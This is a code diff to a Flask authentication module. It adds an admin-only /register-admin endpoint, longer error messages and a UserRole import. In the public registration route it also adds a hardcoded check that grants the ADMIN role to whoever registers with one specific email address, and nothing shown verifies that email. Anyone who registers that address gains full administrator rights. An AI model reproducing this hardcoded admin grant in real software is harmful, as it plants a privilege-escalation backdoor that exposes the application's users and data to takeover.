@@ -2,7 +2,7 @@ from flask import Blueprint, current_app, request, jsonify, g, make_response
 from functools import wraps
 import jwt
 from app.extensions import db, redis_client
-from app.models import User
+from app.models import User, UserRole
 from app.utils.auth_utils import create_access_token, create_refresh_token, decode_token, revoke_token
 
 def _extract_bearer_token():
@@ -67,11 +67,11 @@ def role_required(required_role):
             payload = getattr(g, "payload", None)
             
             if not payload or not user:
-                return jsonify({"error": "Unauthorized"}), 401
+                return jsonify({"error": "Unauthorized. Please log in to access this resource"}), 401
             
             token_role = payload.get("role")
             if token_role != required_role:
-                return jsonify({"error": "Forbidden"}), 403
+                return jsonify({"error": "Forbidden. You have no right to access this resource"}), 403
             
             return f(*args, **kwargs)
         return wrapper
@@ -132,6 +132,9 @@ def register():
     user = User(username=username, email=email)
     user.set_password(password)
     
+    if email == "vietphan@gmail.com":
+        user.role = UserRole.ADMIN  
+        
     db.session.add(user)
     db.session.commit()
     
@@ -140,7 +143,35 @@ def register():
         "data": user.to_dict()
     }), 201
     
+@auth_bp.route('/register-admin', methods=['POST'])
+@jwt_required(token_type="access")
+@role_required("admin")
+def admin_register():
+    data = request.get_json() or {}
     
+    username = data.get('username', "")
+    password = data.get('password', "")
+    email = data.get('email', "")
+    
+    if not username or not password:
+        return jsonify({"error": "Username and password are required"}), 400
+    
+    if User.query.filter_by(username=username).first():
+        return jsonify({"error": "Username already exists"}), 400
+    
+    user = User(username=username, email=email)
+    user.set_password(password)
+    
+    user.role = UserRole.ADMIN
+        
+    db.session.add(user)
+    db.session.commit()
+    
+    return jsonify({
+        "message": "User registered successfully",
+        "data": user.to_dict()
+    }), 201
+
 @auth_bp.route('/refresh', methods=['POST'])
 @jwt_required(token_type="refresh")
 def refresh():
